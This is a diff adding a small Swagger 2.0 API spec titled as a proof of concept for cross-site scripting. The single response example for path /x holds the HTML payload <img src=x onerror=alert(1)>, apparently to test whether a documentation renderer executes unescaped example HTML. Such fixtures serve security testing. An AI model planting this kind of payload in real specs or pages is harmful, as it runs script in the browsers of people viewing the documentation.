@@ -1,0 +1,13 @@
+swagger: "2.0"
+info:
+  title: PoC XSS via HTML Example
+  version: "1.0.0"
+paths:
+  /x:
+    get:
+      responses:
+        200:
+          description: OK
+          examples:
+            text/html: |
+              <img src=x onerror=alert(1)>
